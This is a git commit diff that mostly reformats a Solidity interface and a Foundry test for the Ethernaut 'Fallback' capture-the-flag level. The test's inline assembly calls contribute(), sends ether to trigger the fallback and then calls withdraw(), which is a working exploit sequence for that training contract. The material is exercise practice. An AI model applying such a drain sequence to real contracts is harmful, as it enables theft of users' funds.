9ea29a95ce8dd1a0ccbc696b508eeca9cf81e225
Keshav Mundhra <mundhrakeshav11@gmail.com>
2023-02-14 16:23:07 +0530

    test huff

--- src/huff-learn/IAddTwo.sol
+++ src/huff-learn/IAddTwo.sol
@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
 
-
 interface IAddTwo {
     function addTwo(uint256, uint256) external view returns (uint256);
 }
--- test/CTFs/ethernaut/Fallback/Fallback.t.sol
+++ test/CTFs/ethernaut/Fallback/Fallback.t.sol
@@ -1,5 +1,3 @@
-
-
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.17;
 
@@ -10,6 +8,7 @@ import {BaseTest} from "../BaseTest.t.sol";
 contract FallbackTest is BaseTest {
     Fallback public fallbackInstance = Fallback(payable(0x19F9FC2C0753646e3058978D0D20E5F63D72945A));
     bytes32 CONTRIBUTE_FUNCTION_SIG = keccak256("withdraw()");
+
     function setUp() public override {
         super.setUp();
     }
@@ -33,22 +32,16 @@ contract FallbackTest is BaseTest {
     function exploitYul() internal override {
         address _to = address(fallbackInstance); // TODO: read it using sload and then use
         assembly {
-                        // Function Sig for contribute()
+            // Function Sig for contribute()
             mstore(0x00, 0xd7bb99ba00000000000000000000000000000000000000000000000000000000)
             let success := call(gas(), _to, 1000000000000, 0x00, 0x04, 0x00, 0x00)
-            if iszero(success) {
-                revert(0, 0)
-            }
+            if iszero(success) { revert(0, 0) }
             success := call(gas(), _to, 1000000000000000000, 0x00, 0x00, 0x00, 0x00)
-            if iszero(success) {
-                revert(0, 0)
-            }
-                        // Function Sig for withdraw()
+            if iszero(success) { revert(0, 0) }
+            // Function Sig for withdraw()
             mstore(0x00, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
             success := call(gas(), _to, 0, 0x00, 0x04, 0x00, 0x00)
-            if iszero(success) {
-                revert(0, 0)
-            }
+            if iszero(success) { revert(0, 0) }
         }
     }
 
